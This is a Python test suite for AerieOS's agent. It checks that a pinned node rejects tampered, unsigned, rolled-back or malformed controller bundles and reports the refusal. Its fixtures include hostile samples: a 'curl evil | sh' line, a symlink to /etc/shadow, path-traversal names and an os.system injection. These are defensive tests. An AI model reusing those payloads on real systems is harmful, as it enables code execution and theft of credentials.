"""A node that pinned AerieOS's release key holds the bundle its controller
sends to the list of files the release signed.

The bundle was the controller's word but for root's tools: aerie, its
library, the catalog, the publishers' keys and the hooks were unpacked as
they came, and one of the library's scripts is run as root from root's copy.
Now the bundle carries the list of every file a release ships in it and the
release's signature over that list; a pinned node unpacks it only when the
signature is under a key it trusts and every file is the one listed, with
nothing beside them but what a controller adds of its own. Refused, none of
it is unpacked anywhere, the node goes on with the bundle it has, and the
same bundle is not fetched again until the console's trust or the
controller's bundle moves. While the refusal stands the node says it in its
census, so its controller can say it where a person looks."""
import hashlib
import io
import json
import os
import pathlib
import shutil
import sys
import tarfile
import tempfile
import unittest
from contextlib import redirect_stdout
from unittest import mock

import agentpkg  # noqa: E402

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(HERE, ".."))
sys.path.insert(0, os.path.join(HERE, "..", "..", "lib"))
import bundleparts  # noqa: E402
import workspace as controller  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

# Every release's bundle names its build: the agent package's own
# __init__.py, this tree's here.
BUILD = "scripts/agent/aerieos_agent/__init__.py"
FILES = {"scripts/aerie": b"#!/bin/bash\necho aerie\n", "scripts/lib/sdk.sh": b"sdk\n",
         "scripts/lib/login-list.py": b"print('[]')\n", "config/toolchains.json": b'{"toolchains": []}\n',
         "config/release-keys/node.asc": b"key\n", "nodes/bb-session": b"#!/bin/sh\n",
         BUILD: pathlib.Path(HERE, "..", "..", "agent", "aerieos_agent", "__init__.py").read_bytes()}
# What a controller adds beside them, which no release's list names.
ADDS = {"config/toolpacks.json": b'{"toolchains": []}', "config/toolpacks/hexkit.bundle": b"git bundle",
        "config/toolchains.catalog.json": b'{"toolchains": []}'}


def pair():
    k = Ed25519PrivateKey.generate()
    return k, k.public_key().public_bytes_raw().hex()


def sha(data):
    return hashlib.sha256(data).hexdigest()


def listing(files):
    return "".join(f"{sha(files[n])}  {n}\n" for n in sorted(files))


class Case(unittest.TestCase):
    def setUp(self):
        self.agent = agentpkg.load("aerieos_agent_bundle_files")
        self.release = self.agent.module("release")
        self.k, self.pub = pair()
        self.pinned = {"release_key": self.pub}

    def sign(self, text, key=None, message=None):
        digest = "sha256:" + sha(text.encode())
        return (key or self.k).sign((message or self.release.BUNDLE_MESSAGE) + digest.encode()).hex()

    def members(self, files, **more):
        """What the tar holds as the check is handed it: the files, the list
        and its signature, and whatever else a test puts beside them."""
        text = listing(files)
        held = {n: sha(d) for n, d in files.items()}
        held.update({"nodes/bundle.list": sha(text.encode()), "nodes/bundle.sig": sha(b"{}")})
        held.update(more)
        return text, held


class MayKeep(Case):
    def keep(self, state, files=FILES, sig=None, listed=None, **more):
        text, held = self.members(files, **more)
        text = listing(listed) if listed is not None else text
        return self.release.may_keep_bundle(state, text.encode(), self.sign(text) if sig is None else sig, held, files.get(BUILD))

    def test_the_two_sides_make_the_same_list(self):
        text, digest = bundleparts.listing(list(FILES.items()))
        self.assertEqual(text, listing(FILES))
        self.assertEqual(self.release.bundle_list(text), {n: sha(d) for n, d in FILES.items()})
        self.assertEqual(digest, "sha256:" + sha(text.encode()))
        for bad in ("not a list\n", text + text, text[:-1], text.replace("  ", " ", 1)):
            self.assertIsNone(self.release.bundle_list(bad), bad[:40])

    def test_a_node_that_trusts_no_key_keeps_it_and_says_nothing(self):
        self.assertEqual(self.keep({}, sig=""), (True, ""))
        self.assertEqual(self.keep({}, **{"scripts/extra.py": sha(b"x"), "scripts/aerie": "a link"}), (True, ""))

    def test_signed_and_whole_is_kept_and_said_as_signed(self):
        ok, said = self.keep(self.pinned)
        self.assertTrue(ok, said)
        self.assertEqual(said, f"the bundle's files are signed by the release key this node pinned ({self.pub[:16]}…)")

    def test_a_changed_file_is_refused_by_name(self):
        ok, said = self.keep(self.pinned, **{"scripts/lib/login-list.py": sha(b"import os; os.system('id')\n")})
        self.assertFalse(ok)
        self.assertIn("scripts/lib/login-list.py is changed", said)
        self.assertIn("so this node keeps the bundle it has", said)
        self.assertRegex(said, r"sudo (aerieos|builderbot)-agent unsigned on")
        self.assertRegex(said, r"release-key add HEX")
        self.assertIn(f"the release key it pinned ({self.pub[:16]}…)", said)

    def test_a_missing_file_is_refused_by_name(self):
        short = {n: d for n, d in FILES.items() if n != "scripts/lib/sdk.sh"}
        ok, said = self.keep(self.pinned, files=short, listed=FILES)
        self.assertFalse(ok)
        self.assertIn("scripts/lib/sdk.sh is missing", said)

    def test_a_file_no_release_ships_is_refused_by_name(self):
        ok, said = self.keep(self.pinned, **{"scripts/lib/extra.py": sha(b"import os\n")})
        self.assertFalse(ok)
        self.assertIn("scripts/lib/extra.py is not one a release ships", said)
        # The first wrong one by name is the one said.
        ok, said = self.keep(self.pinned, **{"scripts/zz.py": sha(b"x"), "scripts/aerie": sha(b"other")})
        self.assertIn("scripts/aerie is changed", said)
        self.assertNotIn("zz.py", said)

    def test_what_a_controller_adds_of_its_own_rides_and_nothing_shaped_like_it(self):
        ok, said = self.keep(self.pinned, **{n: sha(d) for n, d in ADDS.items()})
        self.assertTrue(ok, said)
        for name in ("config/toolpacks/../x", "config/toolpacks/../../scripts/aerie.bundle", "config/toolpacks/a/b.bundle",
                     "config/toolpacks/.bundle", "config/toolpacks/..bundle", "config/toolpacks.json.bak",
                     "./config/toolpacks.json", "config/toolchains.catalog.json/x", "nodes/bundle.sig2", "nodes/root-tools.sh",
                     # ...and the second signature over root's tools, which rides no more.
                     "nodes/root-tools.sig"):
            ok, said = self.keep(self.pinned, **{name: sha(b"x")})
            self.assertFalse(ok, name)
            self.assertIn(f"{name} is not one a release ships", said)

    def test_the_list_has_to_be_the_one_signed(self):
        # The release's signature with another list under it: the changed
        # file is listed with its new bytes, and the signature no longer fits.
        other = {**FILES, "scripts/aerie": b"#!/bin/bash\ncurl evil | sh\n"}
        ok, said = self.keep(self.pinned, files=other, sig=self.sign(listing(FILES)))
        self.assertFalse(ok)
        self.assertIn("not the pinned release key's", said)
        # The agent's signature, or one made under the old line for root's
        # tools alone, does not pass as the bundle's.
        for message in (b"aerieos root tools v1\n", self.release.MESSAGE):
            self.assertFalse(self.keep(self.pinned, sig=self.sign(listing(FILES), message=message))[0])
        # No list at all.
        ok, said = self.release.may_keep_bundle(self.pinned, b"", "", {n: sha(d) for n, d in FILES.items()})
        self.assertFalse(ok)
        self.assertIn("the bundle carries no list of its files", said)

    def test_unsigned_is_kept_and_said_only_where_the_console_allows(self):
        ok, said = self.keep(self.pinned, sig="")
        self.assertFalse(ok)
        self.assertIn("the controller sent no signature with it", said)
        self.assertRegex(said, r"sudo (aerieos|builderbot)-agent unsigned on allows unsigned builds")
        allowed = {**self.pinned, "unsigned_ok": True}
        ok, said = self.keep(allowed, sig="")
        self.assertTrue(ok)
        self.assertEqual(said, "the bundle's files not checked (the controller sent no signature with it): "
                               "this node's console allows unsigned builds")
        # Signed and not matching is the same choice, and says which file.
        ok, said = self.keep(allowed, **{"scripts/aerie": sha(b"other")})
        self.assertTrue(ok)
        self.assertIn("not checked (scripts/aerie is changed", said)

    def test_a_key_added_at_the_console_or_the_spare_signs_as_the_release_does(self):
        m, mine = pair()
        text = listing(FILES)
        self.assertFalse(self.keep(self.pinned, sig=self.sign(text, key=m))[0], "not before the key is added")
        ok, said = self.keep({**self.pinned, "release_also": [mine]}, sig=self.sign(text, key=m))
        self.assertTrue(ok, said)
        self.assertIn(f"a key added at this node's console ({mine[:16]}…)", said)
        ok, said = self.keep({"release_also": [mine]}, sig=self.sign(text, key=m))
        self.assertTrue(ok, said)
        s, spare = pair()
        ok, said = self.keep({**self.pinned, "release_spare": spare}, sig=self.sign(text, key=s))
        self.assertTrue(ok, said)
        self.assertIn("the spare release key", said)

    def test_a_member_that_is_no_plain_file_is_refused_whatever_the_console_allows(self):
        for state in (self.pinned, {**self.pinned, "unsigned_ok": True}):
            ok, said = self.keep(state, **{"scripts/aerie": "a link"})
            self.assertFalse(ok)
            self.assertIn("this bundle holds scripts/aerie, which is a link", said)
            ok, said = self.keep(state, **{"scripts/lib/sdk.sh": "there twice"})
            self.assertFalse(ok)
            self.assertIn("scripts/lib/sdk.sh, which is there twice", said)


def tar_bytes(files, sig=None, links=(), twice=(), no_list=False):
    """A bundle as a controller packs it: the files, their list, and the
    signature beside it where there is one."""
    held = dict(files)
    if not no_list:
        held["nodes/bundle.list"] = listing(files).encode()
    if sig:
        held["nodes/bundle.sig"] = json.dumps({"digest": "sha256:" + sha(listing(files).encode()), "sig": sig}).encode()
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w", format=tarfile.PAX_FORMAT) as tar:
        for name, data in list(held.items()) + [(n, files[n]) for n in twice]:
            ti = tarfile.TarInfo(name)
            ti.size = len(data)
            tar.addfile(ti, io.BytesIO(data))
        for name, target in links:
            ti = tarfile.TarInfo(name)
            ti.type, ti.linkname = tarfile.SYMTYPE, target
            tar.addfile(ti)
    return buf.getvalue()


class Checked(Case):
    """The tar itself, as the agent reads it before unpacking anything."""

    def checked(self, body, state=None):
        d = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, d, True)
        path = os.path.join(d, "bundle.tar")
        with open(path, "wb") as f:
            f.write(body)
        return self.agent.WorkspaceMixin._bundle_checked(path, self.pinned if state is None else state)

    def test_a_signed_tar_is_kept_and_a_tampered_one_names_its_file(self):
        sig = self.sign(listing(FILES))
        self.assertTrue(self.checked(tar_bytes({**FILES}, sig))[0])
        with_adds = tar_bytes(FILES, sig)
        self.assertTrue(self.checked(with_adds)[0])
        # The release's list and signature, another file under them.
        buf = io.BytesIO()
        with tarfile.open(fileobj=io.BytesIO(with_adds)) as src, tarfile.open(fileobj=buf, mode="w") as out:
            for m in src:
                data = src.extractfile(m).read()
                if m.name == "scripts/lib/login-list.py":
                    data = b"import os; os.system('id')\n"
                    m.size = len(data)
                out.addfile(m, io.BytesIO(data))
        ok, said = self.checked(buf.getvalue())
        self.assertFalse(ok)
        self.assertIn("scripts/lib/login-list.py is changed", said)

    def test_a_link_a_name_twice_and_a_tar_that_is_none_are_refused(self):
        sig = self.sign(listing(FILES))
        ok, said = self.checked(tar_bytes(FILES, sig, links=[("scripts/lib/evil", "/etc/shadow")]))
        self.assertFalse(ok)
        self.assertIn("scripts/lib/evil, which is a link", said)
        ok, said = self.checked(tar_bytes(FILES, sig, twice=["scripts/aerie"]))
        self.assertFalse(ok)
        self.assertIn("scripts/aerie, which is there twice", said)
        ok, said = self.checked(b"not a tar at all")
        self.assertFalse(ok)
        self.assertIn("cannot be read as a tar", said)
        self.assertEqual(self.checked(b"not a tar at all", state={}), (True, ""), "a node with no key reads nothing here")

    def test_an_unsigned_tar_or_one_with_no_list_is_refused(self):
        self.assertFalse(self.checked(tar_bytes(FILES))[0])
        ok, said = self.checked(tar_bytes(FILES, no_list=True))
        self.assertFalse(ok)
        self.assertIn("the bundle carries no list of its files", said)

    def test_the_controllers_own_bundle_of_the_real_tree_passes_once_signed(self):
        # From the tree to the node: the signer's list (bundleparts), the
        # controller's tar around it, and the agent's check of that tar.
        root = pathlib.Path(HERE).parents[2]
        text, digest = bundleparts.listing(root)

        def packed(signed):
            # What agent.sig would hold, handed over: the real tree's is not written.
            with mock.patch.object(controller, "REPO", root), mock.patch.object(controller, "_bundle", {}), \
                    mock.patch.object(controller, "_bundle_missing", set()), \
                    mock.patch.object(controller, "_signed", lambda part: (digest, signed) if part == "bundle" and signed else ("", "")), \
                    mock.patch.object(controller, "packs_json", lambda: '{"toolchains": []}'), \
                    mock.patch.object(controller, "packs_files", None), \
                    mock.patch.object(controller, "toolchains_json", lambda shipped: shipped), redirect_stdout(io.StringIO()):
                return controller.bundle()["body"]

        ok, said = self.checked(packed(self.sign(text)))
        self.assertTrue(ok, said)
        self.assertIn("signed by the release key", said)
        ok, said = self.checked(packed(""))
        self.assertFalse(ok)
        self.assertIn("the controller sent no signature with it", said)


class FetchWorld(Case):
    """bundle() end to end against a controller that serves what a test hands it."""

    def setUp(self):
        super().setUp()
        self.store = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.store, True)
        self.trust = dict(self.pinned)
        self.serving = b""
        self.fetches = 0
        self.logged = []
        self.started = []
        test = self

        class Ctl:
            def fetch(self, path, dest, timeout=600):
                test.fetches += 1
                with open(dest, "wb") as f:
                    f.write(test.serving)
                return 200, "sha256:" + sha(test.serving)

        class Fake(self.agent.WorkspaceMixin, self.agent.SessionsMixin):
            state = {"stores": {"toolchains": self.store}}
            ctl = Ctl()
            session_up = False
            session_bundle = ""
            session_digest = ""
            session_stale = ""

            def own_dir(self, store, who):
                pass

            def session_account(self):
                return "builder"

            def as_user(self, env, user):
                return None

            def session_start(self, into):
                test.started.append(into)
                self.session_up = True

        self.agent.tc_root = lambda state: state["stores"]["toolchains"]
        self.agent.load_state = lambda: dict(test.trust)
        self.agent.log = self.logged.append
        self.a = Fake()
        self.bb = os.path.join(self.store, ".bb")

    def serve(self, files, signed=True, **more):
        self.serving = tar_bytes(files, self.sign(listing(files)) if signed else None, **more)
        return "sha256:" + sha(self.serving)

    def tampered(self):
        """The release's list and signature with another library file under them."""
        good = tar_bytes(FILES, self.sign(listing(FILES)))
        buf = io.BytesIO()
        with tarfile.open(fileobj=io.BytesIO(good)) as src, tarfile.open(fileobj=buf, mode="w") as out:
            for m in src:
                data = src.extractfile(m).read()
                if m.name == "scripts/lib/login-list.py":
                    data = b"import os; os.system('id')\n"
                    m.size = len(data)
                out.addfile(m, io.BytesIO(data))
        self.serving = buf.getvalue()
        return "sha256:" + sha(self.serving)

    def current(self):
        link = os.path.join(self.bb, "current")
        return os.readlink(link) if os.path.islink(link) else ""

    class Job:
        def __init__(self):
            self.out = []

        def say(self, text):
            self.out.append(text)



class Fetched(FetchWorld):
    def test_a_signed_bundle_is_unpacked_and_said_once(self):
        digest = self.serve(FILES)
        into = self.a.bundle(None, None)
        self.assertEqual(into, os.path.join(self.bb, digest[7:23]))
        self.assertEqual(self.current(), digest[7:23])
        with open(os.path.join(into, "scripts", "lib", "login-list.py"), "rb") as f:
            self.assertEqual(f.read(), FILES["scripts/lib/login-list.py"])
        self.assertEqual(len([ln for ln in self.logged if "the bundle's files are signed by the release key" in ln]), 1)
        self.assertEqual(self.a.session_digest, digest)
        del self.logged[:]
        self.assertEqual(self.a.bundle(None, None), into)
        self.assertEqual(self.logged, [], "the same bundle fetched again says nothing again")

    def test_a_refused_bundle_is_unpacked_nowhere_and_the_one_before_goes_on(self):
        good = self.serve(FILES)
        before = self.a.bundle(None, None)
        bad = self.tampered()
        del self.logged[:]
        self.assertEqual(self.a.bundle(None, None), before, "the answer is the bundle it had")
        self.assertEqual(self.current(), good[7:23], ".bb/current is where it was")
        self.assertFalse(os.path.exists(os.path.join(self.bb, bad[7:23])), "nothing of the refused one is unpacked")
        self.assertEqual(sorted(os.listdir(self.bb)), sorted([good[7:23], "bundle.tar", "current"]), "and its tar is gone")
        with open(os.path.join(self.bb, "bundle.tar"), "rb") as f:
            self.assertEqual("sha256:" + sha(f.read()), good, "the tar that stays is the kept bundle's")
        self.assertIn("scripts/lib/login-list.py is changed", self.logged[0])
        self.assertIn(f"goes on with the bundle it had before ({good[7:19]})", self.logged[1])
        self.assertEqual(self.a.session_digest, good, "what the terminals run is still said as the one before")

    def test_root_s_copies_are_not_made_of_a_refused_bundle(self):
        kept = []
        tools = os.path.join(self.store, "root-tools")
        self.agent.TOOLS_DIR = tools
        for name in ("_keep_root_tools", "_keep_root_bundle"):
            p = mock.patch.object(type(self.a), name, staticmethod(lambda *a, _n=name, **k: kept.append(_n)))
            p.start()
            self.addCleanup(p.stop)
        with mock.patch.object(os, "geteuid", lambda: 0):
            self.serve(FILES)
            self.assertTrue(self.a.bundle(None, None))
            self.assertEqual(kept, ["_keep_root_tools", "_keep_root_bundle"])
            del kept[:]
            self.tampered()
            self.a.bundle(None, None)
            self.assertEqual(kept, [], "neither root's tools nor root's bundle is touched")
            self.assertEqual(os.listdir(tools), ["bundle.tar"], "the refused tar is gone from root's folder")

    def test_the_tar_unpacked_is_the_tar_checked_whatever_another_thread_fetched(self):
        # A job's thread and the loop each fetch a bundle. The controller
        # hands one the release's and the other, a moment later, its own:
        # the second lands between the first one's check and its unpacking.
        import threading
        good = self.serve(FILES)
        checked = type(self.a)._bundle_checked
        raced = []

        def check_then_another_arrives(tar_path, trust):
            got = checked(tar_path, trust)
            if not raced:
                raced.append(self.tampered())
                other = threading.Thread(target=lambda: raced.append(self.a.bundle(None, None)))
                other.start()
                other.join(30)
            return got

        with mock.patch.object(type(self.a), "_bundle_checked", staticmethod(check_then_another_arrives)):
            into = self.a.bundle(None, None)
        self.assertEqual(into, os.path.join(self.bb, good[7:23]))
        self.assertEqual(raced[1], "", "the other thread's was refused, with nothing here before it")
        with open(os.path.join(into, "scripts", "lib", "login-list.py"), "rb") as f:
            self.assertEqual(f.read(), FILES["scripts/lib/login-list.py"], "what was unpacked is what was checked")
        self.assertEqual(sorted(os.listdir(self.bb)), sorted([good[7:23], "bundle.tar", "current"]))
        with open(os.path.join(self.bb, "bundle.tar"), "rb") as f:
            self.assertEqual("sha256:" + sha(f.read()), good)

    def test_refused_with_no_bundle_before_answers_none(self):
        self.tampered()
        self.assertEqual(self.a.bundle(None, None), "")
        self.assertEqual(self.current(), "")
        self.assertIn("no bundle from before", self.logged[-1])
        self.assertEqual([x for x in os.listdir(self.bb)], [])

    def test_the_same_refused_bundle_is_not_fetched_again_until_something_moves(self):
        self.serve(FILES)
        before = self.a.bundle(None, None)
        bad = self.tampered()
        self.a.bundle_named = bad            # what the controller's hello names
        self.a.bundle(None, None)
        fetched = self.fetches
        del self.logged[:]
        # The loop asks again at every hello: answered from memory, and not said again.
        for _ in range(3):
            self.assertEqual(self.a.bundle(None, None), before)
        self.assertEqual((self.fetches, self.logged), (fetched, []))
        # A job is told why each time, and fetches nothing either.
        job = self.Job()
        self.assertEqual(self.a.bundle(job, None), before)
        self.assertEqual(self.fetches, fetched)
        self.assertIn("scripts/lib/login-list.py is changed", job.out[0])
        self.assertIn("goes on with the bundle it had before", job.out[1])
        # The controller names another bundle: fetched again (and refused again, being the same bytes).
        self.a.bundle_named = "sha256:" + "0" * 64
        self.a.bundle(None, None)
        self.assertEqual(self.fetches, fetched + 1)
        self.a.bundle_named = bad
        self.a.bundle(None, None)
        self.assertEqual(self.fetches, fetched + 1, "remembered again")
        # The console allows unsigned builds: the same bundle is tried again, and kept.
        self.trust["unsigned_ok"] = True
        del self.logged[:]
        into = self.a.bundle(None, None)
        self.assertEqual(self.fetches, fetched + 2)
        self.assertEqual(into, os.path.join(self.bb, bad[7:23]))
        self.assertEqual(self.current(), bad[7:23])
        self.assertTrue(any("console allows unsigned builds" in ln for ln in self.logged), self.logged)
        self.assertIsNone(self.a.bundle_refused)

    def test_a_key_added_at_the_console_is_a_move_too(self):
        m, mine = pair()
        files = dict(FILES)
        self.serving = tar_bytes(files, self.sign(listing(files), key=m))
        self.a.bundle_named = "sha256:" + sha(self.serving)
        self.assertEqual(self.a.bundle(None, None), "")
        self.a.bundle(None, None)
        self.assertEqual(self.fetches, 1)
        self.trust["release_also"] = [mine]
        self.assertTrue(self.a.bundle(None, None))
        self.assertEqual(self.fetches, 2)

    def test_the_terminals_do_not_start_again_at_every_hello_for_a_refused_bundle(self):
        good = self.serve(FILES)
        self.a.bundle_named = good
        self.a.session_refresh(good)
        self.assertEqual(len(self.started), 1)
        self.assertEqual(self.a.session_bundle, good)
        bad = self.tampered()
        for _ in range(3):
            self.a.bundle_named = bad
            self.a.session_refresh(bad)
        self.assertEqual(len(self.started), 1, "the terminals stay on the bundle this node keeps")
        self.assertEqual(self.a.session_bundle, good, "and say so: not the controller's")
        self.assertEqual(self.fetches, 2, "fetched once, refused once")
        # A good one again: taken, and the terminals move to it.
        other = self.serve({**FILES, "scripts/lib/sdk.sh": b"sdk 2\n"})
        self.a.bundle_named = other
        self.a.session_refresh(other)
        self.assertEqual((len(self.started), self.a.session_bundle), (2, other))

    def test_a_node_starting_on_a_refused_bundle_runs_the_one_it_has_and_names_it(self):
        good = self.serve(FILES)
        self.a.bundle(None, None)
        # The agent starts again: nothing fetched yet in this process.
        self.a.session_digest, self.a.session_bundle, self.a.session_up = "", "", False
        bad = self.tampered()
        self.a.session_refresh(None)
        self.assertEqual(self.started, [os.path.join(self.bb, good[7:23])])
        self.assertEqual(self.a.session_bundle, "sha256:" + good[7:23], "known by its folder, and not the controller's digest")
        self.assertNotEqual(self.a.session_bundle, bad)

    def test_the_refusal_is_reported_while_it_stands(self):
        refused = self.agent.REFUSED
        self.assertIs(self.agent.module("census").REFUSED, refused, "the census reads what bundle() keeps")
        self.assertIs(self.agent.module("workspace").REFUSED, refused)
        self.serve(FILES)
        self.a.bundle(None, None)
        self.assertEqual(refused, {}, "nothing refused: nothing said")
        bad = self.tampered()
        self.a.hello_at = 5
        self.a.bundle(None, None)
        self.assertEqual(refused["digest"], bad, "the digest it refused")
        # What was wrong, as one phrase: which keys this node takes and
        # what its console can do stay in the job's log and this node's.
        self.assertEqual(refused["why"], "scripts/lib/login-list.py is changed: its bytes are not the ones the release signed")
        self.assertNotIn("release-key", refused["why"])
        self.assertNotIn(self.pinned["release_key"][:16], refused["why"])
        self.assertLessEqual(len(refused["why"]), self.agent.REFUSED_MOST)
        self.assertEqual(self.a.hello_at, 0, "told with a hello now, not at the next one")
        # Answered from memory, it still stands, and no hello is asked for again.
        self.a.bundle_named, self.a.hello_at = bad, 5
        self.a.bundle(None, None)
        self.assertEqual((refused["digest"], self.a.hello_at), (bad, 5))
        # A bundle taken clears it, and that is told at once too.
        self.serve(FILES)
        self.a.bundle_named = "sha256:" + sha(self.serving)
        self.assertTrue(self.a.bundle(None, None))
        self.assertEqual((refused, self.a.hello_at), ({}, 0))

    def test_the_report_is_cleared_when_the_trust_changes_and_the_bundle_is_then_taken(self):
        refused = self.agent.REFUSED
        self.serve(FILES)
        self.a.bundle(None, None)
        bad = self.tampered()
        self.a.bundle_named = bad
        self.a.bundle(None, None)
        self.assertEqual(refused["digest"], bad)
        self.trust["unsigned_ok"] = True
        self.assertEqual(refused["digest"], bad, "the console's press alone changes nothing said")
        self.assertEqual(self.a.bundle(None, None), os.path.join(self.bb, bad[7:23]))
        self.assertEqual(refused, {}, "taken under the new trust: no longer said")

    def test_a_refusal_the_controller_came_back_to_is_said_again(self):
        # The controller named another bundle in between (the hello drops
        # what is said of one it no longer serves), then this one again.
        refused = self.agent.REFUSED
        bad = self.tampered()
        self.a.bundle_named = bad
        self.a.bundle(None, None)
        refused.clear()
        self.a.bundle(None, None)
        self.assertEqual(self.fetches, 1, "answered from memory")
        self.assertEqual(refused["digest"], bad)

    def test_the_words_reported_are_bounded(self):
        self.a._refusal_reported("sha256:" + "ab" * 32, "refused: " + "a file name that goes on " * 60)
        why = self.agent.REFUSED["why"]
        self.assertEqual(len(why), self.agent.REFUSED_MOST)
        self.assertTrue(why.endswith("\u2026") and not why.startswith("refused"))

    def test_a_node_with_no_bundle_to_run_says_why_it_has_no_terminals(self):
        bad = self.tampered()
        self.a.session_refresh(bad)
        self.assertEqual(self.started, [])
        self.assertIs(self.agent.SESSION.get("up"), False)
        self.assertIn("refused the controller's bundle", self.agent.SESSION.get("why", ""))

    def test_a_node_that_trusts_no_key_takes_what_it_is_sent_as_before(self):
        self.trust.clear()
        bad = self.tampered()
        into = self.a.bundle(None, None)
        self.assertEqual(into, os.path.join(self.bb, bad[7:23]))
        self.assertFalse([ln for ln in self.logged if "refused" in ln or "signed" in ln or "checked" in ln], self.logged)


class Floor(FetchWorld):
    """A signature says who made a bundle, not when: once two signed
    releases exist, a controller taken over could serve the older one's
    bundle, and with it root's copies of the provisioner, bb-session,
    bb-netcut and sdk.sh. The bundle says its build (the agent package's
    __init__.py, listed and signed with the rest), and a pinned node takes
    none below its own agent's unless its console said so."""

    def built(self, delta):
        """The files with the build member of an agent `delta` builds from this one."""
        major, minor, build = self.agent.AGENT_VERSION.split(".")
        line = f'"""The agent."""\nAGENT_VERSION = "{major}.{minor}.{int(build) + delta}"\n'
        return {**FILES, self.release.BUNDLE_BUILD: line.encode()}

    def test_the_bundle_ships_the_member_that_says_its_build(self):
        self.assertIn(self.release.BUNDLE_BUILD, bundleparts.PARTS)
        self.assertEqual(self.release.version_of(pathlib.Path(HERE, "..", "..", "agent", "aerieos_agent", "__init__.py").read_text())[1],
                         self.agent.AGENT_VERSION)

    def test_an_older_builds_signed_bundle_is_refused_and_root_keeps_its_tools(self):
        kept = []
        self.agent.TOOLS_DIR = os.path.join(self.store, "root-tools")
        for name in ("_keep_root_tools", "_keep_root_bundle"):
            p = mock.patch.object(type(self.a), name, staticmethod(lambda *a, _n=name, **k: kept.append(_n)))
            p.start()
            self.addCleanup(p.stop)
        with mock.patch.object(os, "geteuid", lambda: 0):
            self.serve(self.built(0))
            before = self.a.bundle(None, None)
            self.assertTrue(before)
            del kept[:]
            self.serve(self.built(-1))
            self.assertEqual(self.a.bundle(None, None), before, "the node goes on with the bundle it had")
        self.assertEqual(kept, [], "neither root's tools nor root's bundle is made of it")
        self.assertEqual(self.a.bundle_refused["cause"], self.release.BUNDLE_OLDER)

    def test_the_console_lets_an_older_one_back(self):
        self.trust["older_ok"] = True
        self.serve(self.built(-5))
        self.assertTrue(self.a.bundle(None, None))
        self.assertIsNone(self.a.bundle_refused)

    def test_the_same_or_a_newer_build_is_taken(self):
        for files in (self.built(0), self.built(2), FILES):
            self.serve(files)
            self.assertTrue(self.a.bundle(None, None), files.get(self.release.BUNDLE_BUILD))
            self.assertIsNone(self.a.bundle_refused)

    def test_one_that_names_no_build_is_refused_unless_the_console_lets_an_older_one_back(self):
        # Only branch builds of 20 to 21 Nov signed a list with no build in
        # it: replayed, it had no floor under it at all (review of 22 Nov).
        bare = {n: d for n, d in FILES.items() if n != self.release.BUNDLE_BUILD}
        self.serve(bare)
        self.assertEqual(self.a.bundle(None, None), "")
        self.assertEqual(self.a.bundle_refused["cause"], self.release.BUNDLE_UNDATED)
        self.trust["older_ok"] = True
        self.serve(bare)
        self.assertTrue(self.a.bundle(None, None))
        self.assertIsNone(self.a.bundle_refused)

    def test_the_build_is_the_one_the_list_signed(self):
        # The member changed after the signing names its file, whatever build it says.
        files = self.built(-1)
        good = tar_bytes(files, self.sign(listing(files)))
        buf = io.BytesIO()
        with tarfile.open(fileobj=io.BytesIO(good)) as src, tarfile.open(fileobj=buf, mode="w") as out:
            for m in src:
                data = src.extractfile(m).read()
                if m.name == self.release.BUNDLE_BUILD:
                    data = self.built(9)[self.release.BUNDLE_BUILD]
                    m.size = len(data)
                out.addfile(m, io.BytesIO(data))
        self.serving = buf.getvalue()
        self.assertEqual(self.a.bundle(None, None), "")
        self.assertIn(f"{self.release.BUNDLE_BUILD} is changed", self.a.bundle_refused["why"])


class Hello(Case):
    """What a hello does with a refusal that is being said."""

    def test_a_refusal_of_a_bundle_the_controller_no_longer_serves_is_no_longer_said(self):
        m = self.agent
        m.log = lambda *a, **k: None
        m.share_images = lambda *a, **k: None
        m.census = lambda state: {}
        m.own_digest = lambda: "sha256:agent"
        m.save_state = lambda s: None
        a = object.__new__(m.Agent)
        a.state, a.warned_caps, a.session_bundle = {}, True, "sha256:kept"
        named, tried = [], []

        class Ctl:
            def call(self, verb, body=None, timeout=30):
                return 200, {"bundle": named[-1], "node": {"id": "n1", "name": "n", "state": "online"}}

        a.ctl = Ctl()
        a.running_ids = lambda: []
        a.keep_session_tokens = lambda rows: None
        a.runner_sync = lambda: None
        a.refresh_session_tool = lambda: None
        # The fetch that follows is the session half's: here it only notes
        # what was being said when it was reached.
        a.session_try = lambda digest: tried.append((digest, dict(m.REFUSED)))
        refused, other = "sha256:" + "ab" * 32, "sha256:" + "cd" * 32
        m.REFUSED.update(digest=refused, why="scripts/aerie is changed")
        named.append(refused)
        a.hello()
        self.assertEqual(a.bundle_named, refused)
        self.assertEqual(tried[-1], (refused, {"digest": refused, "why": "scripts/aerie is changed"}), "still served: still said")
        named.append(other)
        a.hello()
        self.assertEqual(tried[-1], (other, {}), "another bundle is served: the refusal of the one before is dropped")
        self.assertEqual(m.REFUSED, {})
        # A controller that names no bundle (a hosting-only node's hello) drops nothing.
        m.REFUSED.update(digest=refused, why="x")
        named.append("")
        a.hello()
        self.assertEqual(m.REFUSED["digest"], refused)


if __name__ == "__main__":
    unittest.main()
